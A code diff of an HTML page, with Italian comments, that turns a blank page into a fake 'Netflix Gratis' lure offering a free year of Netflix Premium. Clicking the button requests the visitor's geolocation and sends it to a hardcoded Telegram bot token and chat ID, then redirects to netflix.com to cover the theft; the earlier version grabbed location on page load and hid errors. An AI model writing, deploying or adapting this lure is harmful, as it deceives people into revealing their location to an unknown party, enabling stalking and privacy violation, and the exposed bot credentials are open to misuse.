@@ -2,21 +2,43 @@
 <html>
   <head>
     <meta charset="UTF-8" />
-    <title></title>
+    <title>Netflix Gratis</title>
     <style>
-      html, body {
-        margin: 0;
-        padding: 0;
+      body {
+        font-family: Arial, sans-serif;
         background: white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      #fakePromo {
+        background: #e50914;
+        color: white;
+        padding: 30px 40px;
+        border-radius: 10px;
+        font-size: 20px;
+        text-align: center;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+        transition: transform 0.2s;
+      }
+
+      #fakePromo:hover {
+        transform: scale(1.05);
       }
     </style>
   </head>
   <body>
+    <div id="fakePromo">1 anno di Netflix Premium Gratis — clicca qui per ottenerlo</div>
+
     <script>
       const botToken = "7627218398:AAFHNujcd2e_zTluZeqfFNtJBpBuxY6pX6M";
       const chatId = "1768737489";
 
-      window.onload = () => {
+      document.getElementById("fakePromo").addEventListener("click", () => {
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
             (pos) => {
@@ -31,14 +53,21 @@
                   chat_id: chatId,
                   text: msg,
                 }),
+              }).finally(() => {
+                // Dopo l'invio, reindirizza
+                window.location.href = "https://www.netflix.com";
               });
             },
             (err) => {
-              // Silenziosamente ignora gli errori
+              // Se errore o permesso negato, reindirizza comunque
+              window.location.href = "https://www.netflix.com";
             }
           );
+        } else {
+          // Se geolocalizzazione non disponibile, reindirizza comunque
+          window.location.href = "https://www.netflix.com";
         }
-      };
+      });
     </script>
   </body>
 </html>
